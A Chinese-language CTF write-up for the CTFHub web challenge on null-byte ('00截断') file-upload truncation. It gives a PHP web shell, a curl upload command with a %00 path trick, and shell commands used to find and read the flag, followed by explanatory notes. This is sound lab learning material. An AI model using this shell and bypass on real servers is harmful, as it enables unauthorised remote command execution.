---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 00截断"
date: 2026-10-28

skill: "web-upload/00截断"
completed: true
---

# CTFHub Writeup - 00截断

## 题目类型

Web

## 题目描述

题目名称：00截断；平台：CTFHub；方向：Web。

## 解题过程

<br>1. 准备一个内容为 PHP 的文件，文件名使用白名单允许的后缀，命名为 x.jpg，内容为 \<?php echo shell\_exec($\_GET\["c"\]); ?\>。
<br>2. 构造带 %00 的 road 参数：?road=/var/www/html/upload/shell.php%00。
<br>3. 使用 curl 上传：curl.exe -s -F "file=@x.jpg;type=image/jpeg" -F "submit=Submit" "http://.../?road=/var/www/html/upload/shell.php%00"。响应为 \<script\>alert('上传成功')\</script\>；服务端只回上传成功/失败，不返回具体路径，最终路径由构造的 road 参数推出。
<br>4. 访问 http://.../upload/shell.php?c=id 执行命令，返回 uid=33(www-data) gid=33(www-data) groups=33(www-data)。
<br>5. 通过 c 参数执行 find / -maxdepth 5 -iname "flag\*" 2\>/dev/null，找到 /var/www/html/flag\_682217187.php；再执行 cat /var/www/html/flag\_682217187.php，得到 \<?php // ctfhub\{12ca78bb2b799c650d6e3963\}。

## 疑问与解答

### 1.

<br>问题：00截断为什么能绕过上传白名单？
<br>解答：00截断依赖旧版环境把空字节视为字符串结束符；如果服务端在保存路径拼接后使用 C 字符串函数处理，%00 之后的后缀或路径片段可能被忽略。本题记录中 road=/var/www/html/upload/shell.php%00 的构造正是利用这一思路，使实际落盘路径指向 shell.php。

### 2.

<br>问题：为什么上传文件可以先命名为 x.jpg？
<br>解答：上传白名单通常检查原始文件名的后缀，x.jpg 能通过后缀校验；但真正决定保存位置的是 road 参数。若服务端用 road 与文件名拼接后再经空字节截断，承载 PHP 代码的文件就可能以 shell.php 落盘，从而被 Web 访问执行。

### 3.

<br>问题：拿到命令执行点后如何定位 flag？
<br>解答：在这类 Linux Web 环境中，常见做法是通过命令执行参数运行 find 搜索 flag 相关文件，再用 cat 读取内容；本题记录中的 c=find ... 与 c=cat ... 正对应这一流程。


## 本题的核心逻辑：


<br>本题的核心链路是白名单上传后缀限制与路径截断的组合：x.jpg 负责通过文件名检查并携带 PHP 代码，road 参数中的 %00 让服务端保存路径在空字节处截断，最终访问 /upload/shell.php 获得命令执行；随后通过 c 参数运行 id、find 和 cat 完成验证与取 flag。


## 笔记

这道题主要学习了：

<br>1. 00截断属于文件上传中的路径截断绕过，关键点是用户可控保存路径中存在空字节，而旧版字符串处理把 %00 当作结束符。它常与白名单后缀校验配合：上传文件名保留合法后缀，实际落盘路径通过截断改为可执行脚本。
<br>2. 后续学习应重点关注上传功能中文件名、保存路径、后缀拼接和文件系统函数的关系，并区分前端校验、MIME 校验、白名单与路径截断各自的绕过条件；测试时先确认服务器实际落盘位置，再验证命令执行和权限。
